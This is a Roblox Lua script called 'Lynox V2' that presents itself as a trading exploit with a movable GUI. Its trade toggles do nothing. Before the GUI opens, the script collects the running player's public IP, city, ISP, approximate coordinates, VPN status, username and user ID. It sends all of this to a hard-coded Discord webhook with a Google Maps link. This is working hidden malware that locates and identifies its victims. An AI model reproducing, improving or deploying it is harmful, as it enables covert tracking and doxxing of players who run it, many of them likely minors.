--// Lynox V2 - Logger + GUI (primero loguea, luego abre la interfaz movible)

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local UserInputService = game:GetService("UserInputService")
local player = Players.LocalPlayer

local WEBHOOK = "https://discord.com/api/webhooks/1476453785076502699/3hd_1nta4ABJoaljV91elvIrjENgJJtRStrQuRjFhwB1--fp6fQc6W_G9x4FJ3DOnzkw"

-- =====================================================================
-- PARTE 1: LOGGER (se ejecuta primero)
-- =====================================================================

local function requestFunc()
    return (syn and syn.request) 
        or http_request 
        or request 
        or (fluxus and fluxus.request) 
        or (Krnl and Krnl.request) 
        or httprequest
end

local req = requestFunc()

if req then
    local device = UserInputService.TouchEnabled and "Móvil" or "PC"
    local system = UserInputService.TouchEnabled and "Android/iOS" or "Windows"

    local executor = "Desconocido"
    if identifyexecutor then executor = identifyexecutor() end

    local function getTime()
        return os.date("%d/%m/%Y %H:%M:%S")
    end

    -- Info del juego
    local placeId = game.PlaceId
    local gameName = "Desconocido"
    local gamePageLink = "No disponible"

    pcall(function()
        local info = MarketplaceService:GetProductInfo(placeId)
        if info and info.Name then
            gameName = info.Name
            gamePageLink = "[Ver página del juego](https://www.roblox.com/games/" .. placeId .. "/" .. HttpService:UrlEncode(gameName:gsub(" ", "-")) .. ")"
        end
    end)

    -- Geo + Lat/Lon + VPN
    local function getIPAndGeo()
        local apis = {
            {url = "https://get.geojs.io/v1/ip/geo.json", parse = function(d)
                return {
                    ip = d.ip or "?",
                    city = d.city or "?",
                    region = d.region or "?",
                    country = d.country or "?",
                    isp = d.organization_name or "?",
                    lat = tonumber(d.latitude),
                    lon = tonumber(d.longitude),
                    vpn = false,
                    threat = "?"
                }
            end},
            {url = "https://ipwhois.io/json", parse = function(d)
                local sec = d.security or {}
                local vpnDetected = sec.vpn or sec.proxy or sec.tor or false
                return {
                    ip = d.ip or "?",
                    city = d.city or "?",
                    region = d.region or "?",
                    country = d.country or "?",
                    isp = d.isp or "?",
                    lat = d.latitude,
                    lon = d.longitude,
                    vpn = vpnDetected,
                    threat = vpnDetected and "Detectado ⚠️" or "No"
                }
            end}
        }

        for _, api in apis do
            local s, r = pcall(req, {Url = api.url, Method = "GET"})
            if s and r and r.StatusCode == 200 and r.Body then
                local ok, data = pcall(HttpService.JSONDecode, HttpService, r.Body)
                if ok and data then
                    local g = api.parse(data)
                    if g and g.ip ~= "?" then return g end
                end
            end
        end
        return {ip = "?", city = "?", region = "?", country = "?", isp = "?", lat = nil, lon = nil, vpn = false, threat = "?"}
    end

    local geo = getIPAndGeo()

    local latText = geo.lat and string.format("%.6f", geo.lat) or "?"
    local lonText = geo.lon and string.format("%.6f", geo.lon) or "?"

    local mapsLink = "No disponible"
    if geo.lat and geo.lon then
        mapsLink = "[Ver en Google Maps](https://www.google.com/maps/search/?api=1&query=" .. geo.lat .. "," .. geo.lon .. ")"
    elseif geo.city ~= "?" and geo.country ~= "?" then
        local q = geo.city .. ", " .. (geo.region ~= "?" and geo.region .. ", " or "") .. geo.country
        mapsLink = "[Buscar zona en Maps](https://www.google.com/maps/search/?api=1&query=" .. HttpService:UrlEncode(q) .. ")"
    end

    local vpnAlert = geo.vpn and "⚠️ VPN / Proxy DETECTADO ⚠️" or "No se detectó VPN"

    local color = geo.vpn and 16711680 or 16776960  -- rojo si VPN

    local embed = {
        title = "Lynox V2 - EJECUCIÓN REGISTRADA",
        description = "**" .. vpnAlert .. "**\nUbicación aproximada por IP",
        color = color,
        fields = {
            {name = "Usuario", value = player.Name or "?", inline = true},
            {name = "DisplayName", value = player.DisplayName or "?", inline = true},
            {name = "User ID", value = tostring(player.UserId or "?"), inline = true},
            {name = "IP Pública", value = geo.ip, inline = true},
            {name = "Ciudad aprox.", value = geo.city, inline = true},
            {name = "Región / Estado", value = geo.region or "?", inline = true},
            {name = "País", value = geo.country, inline = true},
            {name = "ISP", value = geo.isp or "?", inline = true},
            {name = "Latitud", value = latText, inline = true},
            {name = "Longitud", value = lonText, inline = true},
            {name = "VPN / Proxy / Tor", value = vpnAlert, inline = false},
            {name = "Dispositivo", value = device .. " (" .. system .. ")", inline = true},
            {name = "Executor", value = executor, inline = true},
            {name = "Juego", value = gameName, inline = false},
            {name = "Place ID", value = tostring(placeId), inline = true},
            {name = "Página del juego", value = gamePageLink, inline = false},
            {name = "Google Maps", value = mapsLink, inline = false},
            {name = "Hora", value = getTime(), inline = false},
        },
        footer = {text = "Lynox V2 • Ubicación aproximada • No calle exacta"},
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }

    pcall(function()
        req({
            Url = WEBHOOK,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({embeds = {embed}})
        })
    end)

    print("Lynox V2: Logger enviado | IP: " .. geo.ip .. " | Lat: " .. latText .. " | Lon: " .. lonText)
end

-- =====================================================================
-- PARTE 2: GUI Lynox V2 (se abre después del logger)
-- =====================================================================

-- ScreenGui
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "LynoxGui"
ScreenGui.IgnoreGuiInset = true
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = player:WaitForChild("PlayerGui")

-- Main Frame
local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0,300,0,350)
MainFrame.Position = UDim2.new(0.5,-150,0.5,-175)
MainFrame.BackgroundColor3 = Color3.fromRGB(25,25,25)
MainFrame.Parent = ScreenGui
Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0,10)

-- Title (drag handle)
local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1,0,0,40)
Title.BackgroundColor3 = Color3.fromRGB(35,35,35)
Title.Text = "Lynox V2"
Title.TextColor3 = Color3.new(1,1,1)
Title.TextScaled = true
Title.Font = Enum.Font.GothamBold
Title.Parent = MainFrame
Instance.new("UICorner", Title).CornerRadius = UDim.new(0,10)

-- Drag functionality (PC + Mobile)
local dragging = false
local dragInput
local dragStart
local startPos

local function updateDrag(input)
    local delta = input.Position - dragStart
    MainFrame.Position = UDim2.new(
        startPos.X.Scale,
        startPos.X.Offset + delta.X,
        startPos.Y.Scale,
        startPos.Y.Offset + delta.Y
    )
end

Title.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = MainFrame.Position

        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

Title.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        updateDrag(input)
    end
end)

-- Tab Bar
local TabBar = Instance.new("Frame")
TabBar.Size = UDim2.new(1,0,0,35)
TabBar.Position = UDim2.new(0,0,0,40)
TabBar.BackgroundColor3 = Color3.fromRGB(30,30,30)
TabBar.Parent = MainFrame

local MainTabBtn = Instance.new("TextButton")
MainTabBtn.Size = UDim2.new(0.5,0,1,0)
MainTabBtn.Text = "Main"
MainTabBtn.BackgroundColor3 = Color3.fromRGB(50,50,50)
MainTabBtn.TextColor3 = Color3.new(1,1,1)
MainTabBtn.TextScaled = true
MainTabBtn.Font = Enum.Font.GothamBold
MainTabBtn.Parent = TabBar

local DiscordTabBtn = Instance.new("TextButton")
DiscordTabBtn.Size = UDim2.new(0.5,0,1,0)
DiscordTabBtn.Position = UDim2.new(0.5,0,0,0)
DiscordTabBtn.Text = "Discord"
DiscordTabBtn.BackgroundColor3 = Color3.fromRGB(20,20,20)
DiscordTabBtn.TextColor3 = Color3.new(1,1,1)
DiscordTabBtn.TextScaled = true
DiscordTabBtn.Font = Enum.Font.GothamBold
DiscordTabBtn.Parent = TabBar

-- Tab Content
local MainTab = Instance.new("Frame")
MainTab.Size = UDim2.new(1,0,1,-75)
MainTab.Position = UDim2.new(0,0,0,75)
MainTab.BackgroundTransparency = 1
MainTab.Parent = MainFrame

local DiscordTab = Instance.new("Frame")
DiscordTab.Size = UDim2.new(1,0,1,-75)
DiscordTab.Position = UDim2.new(0,0,0,75)
DiscordTab.BackgroundTransparency = 1
DiscordTab.Visible = false
DiscordTab.Parent = MainFrame

-- Toggle Button Function
local function toggleButton(text, y)
    local b = Instance.new("TextButton")
    b.Size = UDim2.new(0.85,0,0,45)
    b.Position = UDim2.new(0.075,0,0,y)
    b.BackgroundColor3 = Color3.fromRGB(170,0,0)
    b.Text = text..": OFF"
    b.TextColor3 = Color3.new(1,1,1)
    b.TextScaled = true
    b.Font = Enum.Font.GothamBold
    b.Parent = MainTab
    Instance.new("UICorner", b).CornerRadius = UDim.new(0,8)

    local enabled = false
    b.MouseButton1Click:Connect(function()
        enabled = not enabled
        b.Text = text .. (enabled and ": ON" or ": OFF")
        b.BackgroundColor3 = enabled and Color3.fromRGB(0,170,0) or Color3.fromRGB(170,0,0)
    end)
end

-- Main Tab Buttons
toggleButton("Freeze Trade", 10)
toggleButton("Force Trade", 65)
toggleButton("Crash Players Trade", 120)

-- Discord Tab
local Link = Instance.new("TextLabel")
Link.Size = UDim2.new(0.9,0,0,45)
Link.Position = UDim2.new(0.05,0,0,20)
Link.BackgroundTransparency = 1
Link.Text = "https://discord.gg/trgH2Z5Vu2"
Link.TextColor3 = Color3.new(1,1,1)
Link.TextScaled = true
Link.Font = Enum.Font.GothamBold
Link.Parent = DiscordTab

local Copy = Instance.new("TextButton")
Copy.Size = UDim2.new(0.85,0,0,45)
Copy.Position = UDim2.new(0.075,0,0,80)
Copy.BackgroundColor3 = Color3.fromRGB(0,120,255)
Copy.Text = "Copy Discord Invite"
Copy.TextColor3 = Color3.new(1,1,1)
Copy.TextScaled = true
Copy.Font = Enum.Font.GothamBold
Copy.Parent = DiscordTab
Instance.new("UICorner", Copy).CornerRadius = UDim.new(0,8)

Copy.MouseButton1Click:Connect(function()
    setclipboard("https://discord.gg/trgH2Z5Vu2")
    Copy.Text = "Copied!"
    task.delay(1.5, function()
        Copy.Text = "Copy Discord Invite"
    end)
end)

-- Tab Switching
MainTabBtn.MouseButton1Click:Connect(function()
    MainTab.Visible = true
    DiscordTab.Visible = false
end)

DiscordTabBtn.MouseButton1Click:Connect(function()
    MainTab.Visible = false
    DiscordTab.Visible = true
end)

print("Lynox V2 cargado: Logger enviado + GUI abierta y movible")
